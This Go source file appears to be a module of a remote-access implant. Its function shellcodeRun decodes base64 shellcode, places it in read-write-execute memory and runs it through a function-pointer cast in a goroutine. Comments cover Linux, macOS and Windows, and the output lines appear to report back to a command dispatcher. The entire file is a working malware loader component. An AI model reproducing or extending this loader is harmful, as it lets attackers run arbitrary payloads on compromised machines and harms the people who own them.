package main

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"unsafe"
)

// execShellcode allocates RWX memory, copies shellcode in, and executes it
// in a new goroutine via a function pointer cast.
// This is an in-process loader — no CreateRemoteThread, no ptrace.
//
// Platform support:
//   linux/darwin: mmap(PROT_READ|PROT_WRITE|PROT_EXEC) via syscall
//   windows:      VirtualAlloc(PAGE_EXECUTE_READWRITE) via kernel32

// shellcodeExec is the platform-specific implementation (see shellcode_unix.go / shellcode_windows.go)
// Declared here for routing from dispatch().

func shellcodeRun(b64 string) (string, string) {
	if runtime.GOOS == "darwin" || runtime.GOOS == "linux" || runtime.GOOS == "windows" {
		sc, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			return "base64 decode error: " + err.Error(), "failed"
		}
		if len(sc) == 0 {
			return "empty shellcode", "failed"
		}
		addr, err := allocExec(sc)
		if err != nil {
			return fmt.Sprintf("alloc failed: %v", err), "failed"
		}
		// Cast to function pointer and call in goroutine
		go func() {
			fn := *(*func())(unsafe.Pointer(&addr))
			fn()
		}()
		return fmt.Sprintf("[+] Shellcode (%d bytes) executing at 0x%x", len(sc), addr), "completed"
	}
	return "unsupported OS: " + runtime.GOOS, "failed"
}
